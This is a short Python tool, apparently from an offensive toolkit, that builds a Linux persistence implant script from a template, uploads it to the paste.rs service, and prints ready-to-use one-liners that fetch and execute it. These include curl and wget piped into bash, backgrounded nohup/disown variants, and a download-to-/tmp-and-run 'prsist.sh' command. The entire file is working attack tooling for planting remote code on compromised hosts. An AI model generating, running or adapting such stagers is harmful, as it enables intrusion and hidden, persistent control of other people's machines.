#!/usr/bin/env python3

import sys
import argparse
import random
import requests
from common import *

TEMPLATE = "./base.sh"
PASTE_URL = "https://paste.rs/"

def create_paste(content: str) -> str:
    response = requests.post(
        PASTE_URL,
        data=content.encode("utf-8"),
        timeout=30
    )
    response.raise_for_status()

    return response.text.strip()

def load_template(filepath: str) -> str:
	with open(filepath, "r") as file:
		return file.read()

def save_payload(data: str, filepath: str) -> None:
	with open(filepath, "w") as file:
		file.write(data)

def generate_payload(implant_url):
	info("Loading template..")
	loaded_template = load_template(TEMPLATE)

	info("Setting loaded template..")
	script = loaded_template.replace("<URL_IMPLANT>", implant_url)

	info("Creating paste for payload deployment")
	pastebin_url = create_paste(script)

	info(f"Pastebin URL: {pastebin_url}\n")
	success(f"timeout 30 curl -sSL {pastebin_url}|bash")
	success(f"nohup bash -c 'curl -sSL {pastebin_url}|bash' &>/dev/null & disown")
	success(f"cd /tmp;curl -sSLo prsist.sh {pastebin_url};chmod +x prsist.sh;./prsist.sh\n")
	success(f"timeout 30 wget -qO- {pastebin_url}|bash")
	success(f"nohup bash -c 'wget -qO- {pastebin_url}|bash' &>/dev/null & disown")
	success(f"cd /tmp;wget -qO prsist.sh {pastebin_url};chmod +x prsist.sh;./prsist.sh")

def main():
	parser = argparse.ArgumentParser(description="Generates a Linux persistence implant script to deploy quickly.")
	parser.add_argument("--url", "-u", required=True, help="Implant URL")
	args = parser.parse_args()

	generate_payload(args.url)

if __name__ == '__main__':
	main()
